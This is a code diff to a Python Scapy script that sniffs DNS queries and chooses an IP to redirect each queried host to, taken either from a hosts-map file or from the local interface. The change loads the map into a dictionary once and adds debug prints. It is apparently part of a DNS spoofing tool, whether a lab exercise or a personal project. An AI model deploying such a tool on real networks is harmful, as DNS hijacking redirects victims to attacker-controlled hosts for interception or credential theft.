@@ -32,20 +32,18 @@ def injector(pkt):
 	redirect_to=""
 	#print '--------------------------------has IP----------------------------------------'
 	if pkt.haslayer(IP) and pkt.haslayer(DNSQR) and pkt[DNS].aa == 0:
-		pkt.show()
+		#pkt.show()
 		#print '--------------------------------has IP----------------------------------------'
 	#if((pkt[IP].src in expression) or (expression == "")): 
 		#if pkt.haslayer(DNSQR): # DNS question record
 		#print 'has DNSQR'
 		affectedHost = pkt[DNSQR].qname
 		if options.hostsmap!=None:
-			file=open(options.hostsmap,"r")
-			for line in file:
-				if affectedHost.rstrip('.') in line:	
-                    			row = line.split(" ")
-                    			redirect_to = row[0]
-					
+			if affectedHost.rstrip('.') in mapping:	
+            			redirect_to = mapping[affectedHost.rstrip('.')]
+				print redirect_to	
 			if(redirect_to==""):
+				print redirect_to
 				return
 					
 		else:
@@ -67,6 +65,7 @@ def injector(pkt):
 
 if __name__ == '__main__':
 	#expression = ""
+	mapping = {}
 	parser = OptionParser()
 	parser.set_conflict_handler("resolve")
 	parser.add_option('-i', dest="interface",default=pcap.lookupdev())
@@ -83,7 +82,20 @@ if __name__ == '__main__':
 	else:
 		exp = ""
 	#get_ip('ens33')
+	print exp
 
+	if options.hostsmap==None:
+		redirect_to = get_ip(options.interface)
+	else:
+		redirect_to = ""
+		file=open(options.hostsmap,"r")
+		for line in file:
+			row = line.split()
+			print row
+                    	mapping[row[1]]=row[0]
+		print mapping
+			#if affectedHost.rstrip('.') in line:	
+            		#	row = line.split(" ")
 	sniff(filter=exp, prn=injector, store=0, iface=options.interface)
 
 
